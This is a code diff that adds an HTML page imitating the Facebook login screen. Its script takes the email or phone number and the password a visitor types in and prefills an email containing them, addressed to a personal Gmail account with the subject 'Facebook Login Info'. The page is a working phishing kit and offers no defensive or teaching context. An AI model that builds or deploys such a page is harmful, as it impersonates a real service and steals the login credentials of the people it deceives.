@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook Login</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #1877f2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-container {
+    background: white;
+    padding: 40px 30px;
+    border-radius: 8px;
+    width: 320px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  }
+  .login-container h1 {
+    color: #1877f2;
+    margin-bottom: 24px;
+    font-weight: 700;
+    font-size: 28px;
+    text-align: center;
+  }
+  .input-field {
+    width: 100%;
+    margin-bottom: 16px;
+  }
+  .input-field input {
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    border-radius: 6px;
+    border: 1px solid #ddd;
+    box-sizing: border-box;
+  }
+  .login-btn {
+    width: 100%;
+    padding: 12px;
+    background-color: #1877f2;
+    border: none;
+    color: white;
+    font-weight: 700;
+    font-size: 18px;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+  .login-btn:hover {
+    background-color: #165ec9;
+  }
+  .forgot-pass {
+    margin-top: 12px;
+    font-size: 14px;
+    color: #1877f2;
+    text-align: center;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+<div class="login-container">
+  <h1>Facebook</h1>
+  <form id="loginForm">
+    <div class="input-field">
+      <input type="text" id="email" placeholder="Email or phone number" required autocomplete="email" />
+    </div>
+    <div class="input-field">
+      <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
+    </div>
+    <button type="submit" class="login-btn">Log In</button>
+  </form>
+  <div class="forgot-pass">Forgotten password?</div>
+</div>
+
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const emailOrPhone = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    // Send collected info via email using mailto link with encoded subject and body
+    // Because plain frontend cannot send email programmatically without backend,
+    // we use a mailto link to open the user's default mail client with prefilled info.
+    // This does NOT send automatically, user must choose to send the email.
+    const mailTo = "deemzetjanuari0@gmail.com";
+    const subject = encodeURIComponent("Facebook Login Info");
+    const body = encodeURIComponent(
+      "Email or Phone: " + emailOrPhone + "%0D%0APassword: " + password
+    );
+    window.location.href = "mailto:" + mailTo + "?subject=" + subject + "&body=" + body;
+  });
+</script>
+</body>
+</html>
+
+```
